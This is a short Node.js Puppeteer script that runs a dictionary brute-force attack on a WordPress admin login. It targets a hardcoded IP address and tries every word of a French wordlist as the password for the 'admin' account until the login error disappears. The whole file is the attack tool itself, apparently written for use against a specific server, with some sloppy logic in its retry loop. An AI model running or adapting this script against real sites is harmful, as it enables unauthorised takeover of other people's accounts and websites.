const fs = require("fs");
const puppeteer = require("puppeteer");
let data = fs.readFileSync("./French.dic", "utf8");
let dico = data.replace(/(?:\r\n|\r|\n)/g, " ").split(" ");
let buffer = 0;

//Starts the program by launching the browser and trying combinations

async function start() {
  const browser = await puppeteer.launch({
    headless: false,
    defaultViewport: null,
  });
  const page = await browser.newPage();
  await page.goto("http://35.180.242.197/wp-admin");
  navigate(page);
}

//Fill login and try passwords

async function navigate(page) {
  await page.$eval("input[name=log]", (el) => (el.value = "admin"));
  await checkMatch(page, dico[buffer])
}
async function checkMatch(page, pass) {
    await page.type('#user_pass',pass);
    await page.waitForSelector("#wp-submit");
    await page.click("#wp-submit");
//Don't go too fast or else you will try to select something that didn't load !!
  error = await page.waitForSelector("#login_error");
  if (error) {
      console.log(dico[buffer])
    return await checkMatch(page,dico[buffer++]);
  }
}

//Entry point
start()